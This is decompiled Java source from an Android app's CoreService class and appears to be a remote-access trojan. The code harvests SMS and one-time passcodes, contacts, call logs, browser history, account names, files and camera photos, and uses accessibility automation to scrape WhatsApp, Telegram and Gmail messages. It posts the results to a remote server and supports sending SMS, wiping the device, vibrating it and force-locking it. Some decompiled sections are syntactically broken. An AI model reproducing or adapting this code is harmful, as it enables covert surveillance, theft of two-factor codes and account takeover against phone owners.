                            Object object4 = ConfigFetcher.getBaseUrl((Context)this);
                            object2 = null;
                            if (object4 == null) {
                                return null;
                            }
                            Object object5 = "===" + System.currentTimeMillis() + "===";
                            Object object6 = new StringBuilder();
                            object3 = new URL(((StringBuilder)object6).append((String)object4).append("/upload").toString());
                            object2 = object3 = (HttpURLConnection)((URL)object3).openConnection();
                            ((URLConnection)object3).setDoInput(true);
                            object2 = object3;
                            ((URLConnection)object3).setDoOutput(true);
                            object2 = object3;
                            ((URLConnection)object3).setUseCaches(false);
                            object2 = object3;
                            ((HttpURLConnection)object3).setRequestMethod("POST");
                            object2 = object3;
                            ((URLConnection)object3).setRequestProperty("Connection", "Keep-Alive");
                            object2 = object3;
                            object2 = object3;
                            object4 = new StringBuilder("multipart/form-data; boundary=");
                            object2 = object3;
                            ((URLConnection)object3).setRequestProperty("Content-Type", ((StringBuilder)object4).append((String)object5).toString());
                            object2 = object3;
                            object2 = object3;
                            object4 = new DataOutputStream(((URLConnection)object3).getOutputStream());
                            object2 = object3;
                            object2 = object3;
                            object6 = new StringBuilder("--");
                            object2 = object3;
                            ((DataOutputStream)object4).writeBytes(((StringBuilder)object6).append((String)object5).append("\r\n").toString());
                            object2 = object3;
                            object2 = object3;
                            object6 = new StringBuilder("Content-Disposition: form-data; name=\"file\"; filename=\"");
                            object2 = object3;
                            ((DataOutputStream)object4).writeBytes(((StringBuilder)object6).append(((File)object).getName()).append("\"\r\n").toString());
                            object2 = object3;
                            object2 = object3;
                            object6 = new StringBuilder("Content-Type: ");
                            object2 = object3;
                            ((DataOutputStream)object4).writeBytes(((StringBuilder)object6).append(URLConnection.guessContentTypeFromName(((File)object).getName())).append("\r\n").toString());
                            object2 = object3;
                            ((DataOutputStream)object4).writeBytes("\r\n");
                            object2 = object3;
                            object2 = object3;
                            object6 = new FileInputStream((File)object);
                            object2 = object3;
                            object = new byte[8192];
                            while (true) {
                                object2 = object3;
                                int n = ((FileInputStream)object6).read((byte[])object);
                                if (n == -1) break;
                                object2 = object3;
                                ((DataOutputStream)object4).write((byte[])object, 0, n);
                                continue;
                                break;
                            }
                            object2 = object3;
                            ((FileInputStream)object6).close();
                            object2 = object3;
                            ((DataOutputStream)object4).writeBytes("\r\n");
                            object2 = object3;
                            object2 = object3;
                            object = new StringBuilder();
                            object2 = object3;
                            ((DataOutputStream)object4).writeBytes(((StringBuilder)object).append("--").append((String)object5).append("--").append("\r\n").toString());
                            object2 = object3;
                            ((DataOutputStream)object4).flush();
                            object2 = object3;
                            ((FilterOutputStream)object4).close();
                            object2 = object3;
                            if (((HttpURLConnection)object3).getResponseCode() != 200) break block56;
                            object2 = object3;
                            object2 = object3;
                            object2 = object3;
                            object5 = new InputStreamReader(((URLConnection)object3).getInputStream());
                            object2 = object3;
                            object = new BufferedReader((Reader)object5);
                            object2 = object3;
                            object2 = object3;
                            object5 = new StringBuilder();
                            while (true) {
                                object2 = object3;
                                object4 = ((BufferedReader)object).readLine();
                                if (object4 == null) break;
                                object2 = object3;
                                ((StringBuilder)object5).append((String)object4);
                                continue;
                                break;
                            }
                            object2 = object3;
                            ((BufferedReader)object).close();
                            object2 = object3;
                            object2 = object3;
                            object = new JSONObject(((StringBuilder)object5).toString());
                            object2 = object3;
                            try {
                                object = object.optString("url");
                                if (object3 != null) {
                                    ((HttpURLConnection)object3).disconnect();
                                }
                                return object;
                            }
                            catch (Exception exception) {
                                object = object3;
                                object3 = exception;
                                break block57;
                            }
                        }
                        if (object3 == null) break block59;
                        object = object3;
                        break block60;
                        catch (Throwable throwable) {
                            break block58;
                        }
                        catch (Exception exception) {
                            object = null;
                        }
                    }
                    object2 = object;
                    try {
                        Log.e((String)TAG, (String)"Upload error", (Throwable)object3);
                        if (object == null) break block59;
                    }
                    catch (Throwable throwable) {
                        // empty catch block
                    }
                }
                ((HttpURLConnection)object).disconnect();
            }
            return null;
        }
        if (object2 != null) {
            ((HttpURLConnection)object2).disconnect();
        }
        throw var1_4;
    }

    private void vibrate() {
        Vibrator vibrator = (Vibrator)this.getSystemService("vibrator");
        if (vibrator == null) {
            return;
        }
        if (Build.VERSION.SDK_INT >= 26) {
            vibrator.vibrate(VibrationEffect.createOneShot((long)20000L, (int)-1));
        } else {
            vibrator.vibrate(20000L);
        }
    }

    private void waitForBaseUrlAndRegister() {
        ConfigFetcher.bootstrapConfig((Context)this, new ConfigFetcher.ConfigListener(this){
            final CoreService this$0;
            {
                this.this$0 = coreService;
            }

            @Override
            public void onConfigFailed() {
                Log.w((String)CoreService.TAG, (String)"baseUrl tidak ditemukan");
            }

            @Override
            public void onConfigLoaded(String string2) {
                this.this$0.registerDevice(string2);
            }
        });
    }

    private void wipe() {
        new Thread(new CoreService$$ExternalSyntheticLambda12(this)).start();
        this.sendSimpleResult("wipe", "started");
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$changeWallpaper$22$com_love_app_CoreService(String string2, String object) {
        this.threadCmdId.set(string2);
        try {
            WallpaperManager wallpaperManager = WallpaperManager.getInstance((Context)this);
            if (object != null && (((String)object).startsWith("http://") || ((String)object).startsWith("https://"))) {
                URL uRL = new URL((String)object);
                object = (HttpURLConnection)uRL.openConnection();
                ((URLConnection)object).setDoInput(true);
                ((URLConnection)object).connect();
                object = BitmapFactory.decodeStream((InputStream)((URLConnection)object).getInputStream());
                if (object != null) {
                    wallpaperManager.setBitmap((Bitmap)object);
                    this.sendResult("wallpaper", "changed", string2);
                    return;
                }
            }
            wallpaperManager.setResource(2131623936);
            this.sendResult("wallpaper", "changed (default)", string2);
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"wallpaper error", (Throwable)exception);
            this.sendResult("wallpaper_error", exception.getMessage(), string2);
        }
    }

    /*
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$fetchGallery$26$com_love_app_CoreService(boolean bl, int n) {
        void var5_9;
        File[] fileArray;
        ArrayList<JSONObject> arrayList = new ArrayList<JSONObject>();
        File file = Environment.getExternalStoragePublicDirectory((String)(Environment.DIRECTORY_DCIM + "/Camera"));
        if (file.exists() && (fileArray = file.listFiles()) != null) {
            for (File file2 : fileArray) {
                String string2;
                if (!file2.isFile() || !(string2 = file2.getName().toLowerCase()).endsWith(".jpg") && !string2.endsWith(".jpeg") && !string2.endsWith(".png") && !string2.endsWith(".mp4") && !string2.endsWith(".3gp") && !string2.endsWith(".mov")) continue;
                try {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("name", (Object)file2.getName());
                    jSONObject.put("size", file2.length());
                    jSONObject.put("type", (Object)file2.getName().substring(file2.getName().lastIndexOf(".") + 1));
                    if (bl) {
                        String string3 = this.uploadFileToServer(file2);
                        if (string3 != null) {
                            jSONObject.put("url", (Object)string3);
                        } else {
                            jSONObject.put("path", (Object)file2.getAbsolutePath());
                        }
                    } else {
                        jSONObject.put("path", (Object)file2.getAbsolutePath());
                    }
                    if (string2.endsWith(".jpg") || string2.endsWith(".jpeg") || string2.endsWith(".png")) {
                        jSONObject.put("thumb", (Object)this.getImageThumbnail(file2.getAbsolutePath(), 200));
                    }
                    arrayList.add(jSONObject);
                }
                catch (JSONException jSONException) {}
            }
        }
        ArrayList<JSONObject> arrayList2 = arrayList;
        if (arrayList.size() > n) {
            List list = arrayList.subList(0, n);
        }
        this.sendResult("gallery", new JSONArray((Collection)var5_9).toString());
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$fetchGmailEmails$36$com_love_app_CoreService(int n) {
        Throwable throwable2;
        block13: {
            Object object;
            try {
                List<AccessibilityNodeInfo> list;
                block16: {
                    block15: {
                        block14: {
                            this.ensureGmailWindow();
                            object = this.getRootInActiveWindow();
                            if (object != null) break block14;
                            this.sendResult("gmail_status", "No active window");
                            break block15;
                        }
                        list = this.findEmailItems((AccessibilityNodeInfo)object);
                        if (!list.isEmpty()) break block16;
                        this.sendResult("gmail_status", "No emails found");
                        object.recycle();
                    }
                    this.isGmailFetching.set(false);
                    return;
                }
                int n2 = Math.min(list.size(), n);
                JSONArray jSONArray = new JSONArray();
                for (n = 0; n < n2; ++n) {
                    JSONObject jSONObject;
                    AccessibilityNodeInfo accessibilityNodeInfo = list.get(n);
                    if (accessibilityNodeInfo == null || (jSONObject = this.extractEmailFromListItem(accessibilityNodeInfo)) == null) continue;
                    if (accessibilityNodeInfo.isClickable()) {
                        AccessibilityNodeInfo accessibilityNodeInfo2 = AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo);
                        accessibilityNodeInfo2.performAction(16);
                        accessibilityNodeInfo2.recycle();
                        Thread.sleep(2000L);
                        accessibilityNodeInfo2 = this.readCurrentEmailDetail();
                        if (accessibilityNodeInfo2 != null) {
                            jSONObject.put("body", (Object)accessibilityNodeInfo2.optString("body"));
                            jSONObject.put("attachments", (Object)accessibilityNodeInfo2.optJSONArray("attachments"));
                        }
                        this.performGlobalAction(1);
                        Thread.sleep(1000L);
                    }
                    jSONArray.put((Object)jSONObject);
                    accessibilityNodeInfo.recycle();
                }
                object.recycle();
                this.sendResult("gmail_emails", jSONArray.toString());
            }
            catch (Throwable throwable2) {
                break block13;
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"fetchGmailEmails error", (Throwable)exception);
                object = new StringBuilder();
                this.sendResult("gmail_status", ((StringBuilder)object).append("Error: ").append(exception.getMessage()).toString());
            }
            this.isGmailFetching.set(false);
            return;
        }
        this.isGmailFetching.set(false);
        throw throwable2;
    }

    /* synthetic */ void lambda$fetchNotifications$24$com_love_app_CoreService(String string2) {
        this.sendResult("notifications", string2);
    }

    /* synthetic */ void lambda$fetchNotifications$25$com_love_app_CoreService(VolleyError volleyError) {
        this.sendResult("notifications", "[]");
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$fetchTelegramMessages$34$com_love_app_CoreService(int n) {
        Throwable throwable2;
        block12: {
            CharSequence charSequence;
            try {
                List<AccessibilityNodeInfo> list;
                AccessibilityNodeInfo accessibilityNodeInfo;
                block15: {
                    block14: {
                        block13: {
                            Thread.sleep(1500L);
                            accessibilityNodeInfo = this.getRootInActiveWindow();
                            if (accessibilityNodeInfo != null) break block13;
                            this.sendResult("telegram_messages_status", "No active window");
                            break block14;
                        }
                        list = this.findTelegramChats(accessibilityNodeInfo);
                        if (!list.isEmpty()) break block15;
                        this.sendResult("telegram_messages_status", "No chats found");
                    }
                    this.isTelegramFetching.set(false);
                    return;
                }
                JSONArray jSONArray = new JSONArray();
                int n2 = Math.min(list.size(), n);
                for (n = 0; n < n2; ++n) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = list.get(n);
                    if (accessibilityNodeInfo2 == null) continue;
                    charSequence = this.extractTelegramContact(accessibilityNodeInfo2);
                    if (accessibilityNodeInfo2.isClickable()) {
                        AccessibilityNodeInfo accessibilityNodeInfo3 = AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo2);
                        accessibilityNodeInfo3.performAction(16);
                        accessibilityNodeInfo3.recycle();
                        Thread.sleep(1500L);
                        accessibilityNodeInfo3 = this.readTelegramChat();
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put("contact", (Object)charSequence);
                        jSONObject.put("messages", (Object)accessibilityNodeInfo3);
                        jSONArray.put((Object)jSONObject);
                        this.performGlobalAction(1);
                        Thread.sleep(1000L);
                    }
                    accessibilityNodeInfo2.recycle();
                }
                accessibilityNodeInfo.recycle();
                this.sendResult("telegram_messages", jSONArray.toString());
            }
            catch (Throwable throwable2) {
                break block12;
            }
            catch (Exception exception) {
                charSequence = new StringBuilder();
                this.sendResult("telegram_messages_status", charSequence.append("Error: ").append(exception.getMessage()).toString());
            }
            this.isTelegramFetching.set(false);
            return;
        }
        this.isTelegramFetching.set(false);
        throw throwable2;
    }

    /* synthetic */ void lambda$fetchTelegramMessages$35$com_love_app_CoreService(String object) {
        int n;
        try {
            n = Integer.parseInt((String)object);
        }
        catch (Exception exception) {
            n = 10;
        }
        try {
            object = new CoreService$$ExternalSyntheticLambda38(this, n);
            this.launchAppAndWait(TELEGRAM_PACKAGE, (Runnable)object);
        }
        catch (Exception exception) {
            this.sendResult("telegram_messages_status", "Error: " + exception.getMessage());
            this.isTelegramFetching.set(false);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$fetchWhatsAppMessages$32$com_love_app_CoreService(int n) {
        Throwable throwable2;
        block12: {
            StringBuilder stringBuilder;
            try {
                List<AccessibilityNodeInfo> list;
                AccessibilityNodeInfo accessibilityNodeInfo;
                block15: {
                    block14: {
                        block13: {
                            Thread.sleep(1500L);
                            accessibilityNodeInfo = this.getRootInActiveWindow();
                            if (accessibilityNodeInfo != null) break block13;
                            this.sendResult("whatsapp_messages_status", "No active window");
                            break block14;
                        }
                        list = this.findChatList(accessibilityNodeInfo, "com.whatsapp:id/conversations_row");
                        if (!list.isEmpty()) break block15;
                        this.sendResult("whatsapp_messages_status", "No chats found");
                    }
                    this.isWhatsAppFetching.set(false);
                    return;
                }
                stringBuilder = new JSONArray();
                int n2 = Math.min(list.size(), n);
                for (n = 0; n < n2; ++n) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = list.get(n);
                    if (accessibilityNodeInfo2 == null) continue;
                    String string2 = this.extractContactName(accessibilityNodeInfo2);
                    if (accessibilityNodeInfo2.isClickable()) {
                        AccessibilityNodeInfo accessibilityNodeInfo3 = AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo2);
                        accessibilityNodeInfo3.performAction(16);
                        accessibilityNodeInfo3.recycle();
                        Thread.sleep(1500L);
                        JSONArray jSONArray = this.readWhatsAppChat();
                        accessibilityNodeInfo3 = new JSONObject();
                        accessibilityNodeInfo3.put("contact", (Object)string2);
                        accessibilityNodeInfo3.put("messages", (Object)jSONArray);
                        stringBuilder.put(accessibilityNodeInfo3);
                        this.performGlobalAction(1);
                        Thread.sleep(1000L);
                    }
                    accessibilityNodeInfo2.recycle();
                }
                accessibilityNodeInfo.recycle();
                this.sendResult("whatsapp_messages", stringBuilder.toString());
            }
            catch (Throwable throwable2) {
                break block12;
            }
            catch (Exception exception) {
                stringBuilder = new StringBuilder();
                this.sendResult("whatsapp_messages_status", stringBuilder.append("Error: ").append(exception.getMessage()).toString());
            }
            this.isWhatsAppFetching.set(false);
            return;
        }
        this.isWhatsAppFetching.set(false);
        throw throwable2;
    }

    /* synthetic */ void lambda$fetchWhatsAppMessages$33$com_love_app_CoreService(String object) {
        int n;
        try {
            n = Integer.parseInt((String)object);
        }
        catch (Exception exception) {
            n = 10;
        }
        try {
            object = new CoreService$$ExternalSyntheticLambda16(this, n);
            this.launchAppAndWait(WHATSAPP_PACKAGE, (Runnable)object);
        }
        catch (Exception exception) {
            this.sendResult("whatsapp_messages_status", "Error: " + exception.getMessage());
            this.isWhatsAppFetching.set(false);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$fetchWhatsAppNumberFromSettings$28$com_love_app_CoreService() {
        try {
            Thread.sleep(1500L);
            AccessibilityNodeInfo accessibilityNodeInfo = this.getRootInActiveWindow();
            if (accessibilityNodeInfo == null) {
                this.sendResult("whatsapp_number_error", "Cannot access WhatsApp");
                return;
            }
            List list = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/menu");
            Object object = list;
            if (list.isEmpty()) {
                object = accessibilityNodeInfo.findAccessibilityNodeInfosByText("More options");
            }
            if (object.isEmpty()) {
                this.sendResult("whatsapp_number_error", "Menu button not found");
                return;
            }
            ((AccessibilityNodeInfo)object.get(0)).performAction(16);
            Thread.sleep(800L);
            accessibilityNodeInfo = this.getRootInActiveWindow();
            if (accessibilityNodeInfo == null) return;
            list = accessibilityNodeInfo.findAccessibilityNodeInfosByText("Settings");
            object = list;
            if (list.isEmpty()) {
                object = accessibilityNodeInfo.findAccessibilityNodeInfosByText("Pengaturan");
            }
            if (object.isEmpty()) {
                this.sendResult("whatsapp_number_error", "Settings menu not found");
                return;
            }
            ((AccessibilityNodeInfo)object.get(0)).performAction(16);
            Thread.sleep(1500L);
            object = this.getRootInActiveWindow();
            if (object == null) {
                this.sendResult("whatsapp_number_error", "Settings page not accessible");
                return;
            }
            if ((object = this.extractPhoneNumber((AccessibilityNodeInfo)object)) == null) {
                object = "Not found";
            }
            this.sendResult("whatsapp_number", (String)object);
            return;
        }
        catch (Exception exception) {
            this.sendResult("whatsapp_number_error", exception.getMessage());
        }
    }

    /* synthetic */ void lambda$getBrowserHistory$18$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        try {
            Object object = new BrowserProvider((Context)this);
            object = ((BrowserProvider)object).getSearches().getList();
            List list = object.subList(0, Math.min(object.size(), 100));
            object = new Gson();
            this.sendResult("browser_history", ((Gson)object).toJson(list), string2);
        }
        catch (Exception exception) {
            this.sendResult("browser_history", "error: " + exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$getCallLogs$15$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        try {
            List list = new List((Context)this);
            list = ((CallsProvider)((Object)list)).getCalls().getList();
            list = list.subList(0, Math.min(list.size(), 100));
            Gson gson = new Gson();
            this.sendResult("call_logs", gson.toJson(list), string2);
        }
        catch (Exception exception) {
            this.sendResult("call_logs", "error: " + exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$getContacts$12$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        try {
            Contacts.initialize((Context)this);
            Gson gson = new Gson();
            this.sendResult("contacts", gson.toJson(Contacts.getQuery().find()), string2);
        }
        catch (Exception exception) {
            this.sendResult("contacts", "error: " + exception.getMessage(), string2);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$getFileList$19$com_love_app_CoreService(String string2, String object) {
        File[] fileArray;
        block8: {
            block7: {
                this.threadCmdId.set(string2);
                object = object != null && !((String)object).isEmpty() ? new File((String)object) : null;
                if (object == null) break block7;
                fileArray = object;
                if (((File)object).exists()) break block8;
            }
            fileArray = Environment.getExternalStorageDirectory();
        }
        fileArray = fileArray.listFiles();
        object = new JSONArray();
        if (fileArray != null) {
            for (File file : fileArray) {
                try {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("name", (Object)file.getName());
                    jSONObject.put("path", (Object)file.getAbsolutePath());
                    jSONObject.put("isDir", file.isDirectory());
                    long l = file.isFile() ? file.length() : 0L;
                    jSONObject.put("size", l);
                    object.put((Object)jSONObject);
                }
                catch (JSONException jSONException) {}
            }
        }
        this.sendResult("file_list", object.toString(), string2);
    }

    /* synthetic */ void lambda$getGoogleAccounts$31$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        Account[] accountArray = ((AccountManager)this.getSystemService("account")).getAccountsByType("com.google");
        JSONArray jSONArray = new JSONArray();
        int n = accountArray.length;
        for (int i = 0; i < n; ++i) {
            jSONArray.put((Object)accountArray[i].name);
            continue;
        }
        try {
            this.sendResult("google_accounts", jSONArray.toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("google_error", exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$getOTP$29$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        TelephonyProvider telephonyProvider = new TelephonyProvider((Context)this);
        List<Sms> list = telephonyProvider.getSms(TelephonyProvider.Filter.INBOX).getList();
        int n = Math.min(list.size(), 20);
        telephonyProvider = new JSONArray();
        Pattern pattern = Pattern.compile("\\b(\\d{4,6})\\b");
        for (int i = 0; i < n; ++i) {
            Matcher matcher;
            Sms sms = list.get(i);
            if (sms.body == null || !(matcher = pattern.matcher(sms.body)).find()) continue;
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("from", (Object)sms.address);
            jSONObject.put("body", (Object)sms.body);
            jSONObject.put("otp", (Object)matcher.group(1));
            jSONObject.put("date", sms.date);
            telephonyProvider.put(jSONObject);
            continue;
        }
        try {
            this.sendResult("otp", telephonyProvider.toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("otp_error", exception.getMessage(), string2);
        }
        catch (SecurityException securityException) {
            this.sendResult("otp_error", "Cannot read SMS", string2);
        }
    }

    /* synthetic */ void lambda$getSms$13$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        try {
            Object object = new TelephonyProvider((Context)this);
            object = ((TelephonyProvider)object).getSms(TelephonyProvider.Filter.ALL).getList();
            List list = object.subList(0, Math.min(object.size(), 100));
            object = new Gson();
            this.sendResult("sms", ((Gson)object).toJson(list), string2);
        }
        catch (Exception exception) {
            this.sendResult("sms", "error: " + exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$getTelegram$30$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        AccountManager accountManager = (AccountManager)this.getSystemService("account");
        JSONArray jSONArray = new JSONArray();
        for (int i = 0; i < 2; ++i) {
            String string3 = (new String[]{TELEGRAM_PACKAGE, "org.telegram.account"})[i];
            for (Account account : accountManager.getAccountsByType(string3)) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("type", (Object)string3);
                jSONObject.put("name", (Object)account.name);
                jSONArray.put((Object)jSONObject);
            }
        }
        try {
            this.sendResult("telegram_accounts", jSONArray.toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("telegram_error", exception.getMessage(), string2);
        }
    }

    /* synthetic */ void lambda$getWhatsAppNumber$27$com_love_app_CoreService() {
        this.fetchWhatsAppNumberFromSettings();
    }

    /* synthetic */ void lambda$handleAccessibilityCommandWithFallback$4$com_love_app_CoreService() {
        this.fetchGmailEmails(10);
    }

    /* synthetic */ void lambda$handleAccessibilityCommandWithFallback$5$com_love_app_CoreService(String string2) {
        this.fetchWhatsAppMessages(string2);
    }

    /* synthetic */ void lambda$handleAccessibilityCommandWithFallback$6$com_love_app_CoreService(String string2) {
        this.fetchTelegramMessages(string2);
    }

    /* synthetic */ void lambda$launchAppAndWait$7$com_love_app_CoreService(String string2, Runnable runnable2) {
        this.threadCmdId.set(string2);
        if (this.getRootInActiveWindow() != null) {
            runnable2.run();
        } else {
            this.sendResult("error", "Gagal membuka aplikasi", string2);
        }
    }

    /* synthetic */ void lambda$onAccessibilityEvent$37$com_love_app_CoreService() {
        DevicePolicyManager devicePolicyManager = this.dpm;
        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(this.adminComponent)) {
            this.dpm.lockNow();
        }
    }

    /* synthetic */ void lambda$onAccessibilityEvent$38$com_love_app_CoreService() {
        DevicePolicyManager devicePolicyManager = this.dpm;
        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(this.adminComponent)) {
            this.dpm.lockNow();
        }
    }

    /* synthetic */ void lambda$onAccessibilityEvent$39$com_love_app_CoreService() {
        DevicePolicyManager devicePolicyManager = this.dpm;
        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(this.adminComponent)) {
            this.dpm.lockNow();
        } else {
            this.performGlobalAction(2);
        }
    }

    /* synthetic */ void lambda$registerDevice$2$com_love_app_CoreService(JSONObject object) {
        Log.d((String)TAG, (String)"Registered OK via HTTP");
        String string2 = object.optString("username", "");
        object = object.optString("session_id", "");
        if (!string2.trim().isEmpty()) {
            ConfigFetcher.setUsername((Context)this, string2.trim());
        }
        if (!((String)object).trim().isEmpty()) {
            ConfigFetcher.setSessionId((Context)this, ((String)object).trim());
        }
        this.registered = true;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$sendDeviceInfo$17$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        TelephonyManager telephonyManager = (TelephonyManager)this.getSystemService("phone");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_DEVICE_ID, (Object)this.deviceId);
            jSONObject.put("model", (Object)Build.MODEL);
            jSONObject.put("manufacturer", (Object)Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", (Object)Build.VERSION.RELEASE);
            jSONObject.put("username", (Object)ConfigFetcher.getUsername((Context)this));
            jSONObject.put("session_id", (Object)ConfigFetcher.getSessionId((Context)this));
            BatteryManager batteryManager = (BatteryManager)this.getSystemService("batterymanager");
            if (batteryManager != null) {
                jSONObject.put("battery", batteryManager.getIntProperty(4));
            }
            if (telephonyManager != null) {
                try {
                    jSONObject.put("country", (Object)telephonyManager.getNetworkCountryIso());
                    jSONObject.put("operator", (Object)telephonyManager.getSimOperatorName());
                }
                catch (SecurityException securityException) {
                    jSONObject.put("country", (Object)"");
                    jSONObject.put("operator", (Object)"");
                }
            }
        }
        catch (JSONException jSONException) {}
        this.sendResult("device_info", jSONObject.toString(), string2);
    }

    /* synthetic */ void lambda$sendInstalledApps$11$com_love_app_CoreService(String string2) {
        this.threadCmdId.set(string2);
        PackageManager packageManager = this.getPackageManager();
        List list2 = packageManager.getInstalledApplications(128);
        ArrayList<String> arrayList = new ArrayList<String>();
        for (List list2 : list2) {
            if (packageManager.getLaunchIntentForPackage(((ApplicationInfo)list2).packageName) == null) continue;
            arrayList.add(((ApplicationInfo)list2).packageName);
        }
        this.sendResult("apps", new JSONArray(arrayList).toString(), string2);
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$sendResult$8$com_love_app_CoreService(String var1_1, String var2_2, String var3_3, String var4_4) {
        var6_5 = false;
        var5_6 = 0;
        while (true) {
            block13: {
                if (var6_5 || var5_6 >= 3) ** GOTO lbl116
                var8_8 = var6_5;
                var7_7 = var5_6;
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17 = new JSONObject();
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.put("device_id", (Object)this.deviceId);
                var13_15 = "";
                var12_11 = var1_1 != null ? var1_1 : "";
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.put("cmdId", var12_11);
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.put("type", (Object)var2_2);
                var12_11 = var13_15;
                if (var3_3 != null) {
                    var12_11 = var3_3;
                }
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.put("data", var12_11);
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.put("timestamp", System.currentTimeMillis());
                var8_8 = var6_5;
                var7_7 = var5_6;
                var12_11 = var14_17.toString().getBytes("UTF-8");
                var8_8 = var6_5;
                var7_7 = var5_6;
                var8_8 = var6_5;
                var7_7 = var5_6;
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17 = new StringBuilder();
                var8_8 = var6_5;
                var7_7 = var5_6;
                var13_15 = new URL(var14_17.append(var4_4).append("/result").toString());
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17 = (HttpURLConnection)var13_15.openConnection();
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.setRequestMethod("POST");
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.setConnectTimeout(10000);
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.setReadTimeout(10000);
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                var8_8 = var6_5;
                var7_7 = var5_6;
                var14_17.setDoOutput(true);
                var8_8 = var6_5;
                var7_7 = var5_6;
                var8_8 = var6_5;
                var7_7 = var5_6;
                var13_15 = new DataOutputStream(var14_17.getOutputStream());
                var13_15.write((byte[])var12_11);
                var13_15.flush();
                var8_8 = var6_5;
                var7_7 = var5_6;
                var13_15.close();
                var8_8 = var6_5;
                var7_7 = var5_6++;
                var9_9 = var14_17.getResponseCode();
                if (var9_9 == 200 || var9_9 == 201) ** GOTO lbl88
                var8_8 = var6_5;
                var7_7 = var5_6;
                Thread.sleep(var5_6 * 2000);
                break block13;
lbl88:
                // 1 sources

                var6_5 = true;
            }
            var8_8 = var6_5;
            var7_7 = var5_6;
            var14_17.disconnect();
            catch (Throwable var12_12) {
                try {
                    var13_15.close();
                    ** GOTO lbl103
                }
                catch (Throwable var13_16) {
                    var8_8 = var6_5;
                    var7_7 = var5_6;
                    try {
                        var12_12.addSuppressed(var13_16);
lbl103:
                        // 2 sources

                        var8_8 = var6_5;
                        var7_7 = var5_6;
                        throw var12_12;
                    }
                    catch (Exception var12_13) {
                        var5_6 = var7_7 + 1;
                        var10_10 = var5_6 * 3000;
                        try {
                            Thread.sleep(var10_10);
                            var6_5 = var8_8;
                            continue;
                        }
                        catch (InterruptedException var12_14) {
                            var6_5 = var8_8;
                            continue;
                        }
lbl116:
                        // 1 sources

                        return;
                    }
                }
            }
            break;
        }
    }

    /* synthetic */ void lambda$sendSms$14$com_love_app_CoreService(String string2, String charSequence) {
        this.threadCmdId.set(string2);
        try {
            JSONObject jSONObject = new JSONObject((String)charSequence);
            charSequence = Build.VERSION.SDK_INT >= 31 ? (SmsManager)this.getSystemService(SmsManager.class) : SmsManager.getDefault();
            charSequence.sendTextMessage(jSONObject.getString("phone"), null, jSONObject.getString("message"), null, null);
            charSequence = new StringBuilder("sent to ");
            this.sendResult("sms_status", ((StringBuilder)charSequence).append(jSONObject.getString("phone")).toString(), string2);
        }
